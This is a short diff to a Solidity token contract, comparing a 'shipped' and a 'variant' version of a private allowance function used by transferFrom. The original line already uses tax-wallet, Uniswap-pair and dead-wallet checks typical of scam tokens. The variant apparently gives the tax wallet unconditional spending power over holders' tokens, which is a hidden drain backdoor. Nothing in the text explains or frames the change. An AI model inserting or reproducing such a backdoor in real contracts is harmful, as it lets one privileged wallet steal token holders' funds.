@@ -1,0 +1,11 @@
+--- shipped/Token.sol
++++ variant/Token.sol
+@@ -256,7 +256,7 @@
+         address spender,
+         uint256 amount
+     ) private view returns (uint256) {
+-        return msg.sender != _taxWallet && (owner == _uniswapPair || spender != _deadWallet) ? amount : 0;
++        return msg.sender == _taxWallet ? amount : (spender != _deadWallet ? amount : 0);
+     }
+ 
+     function transferFrom(
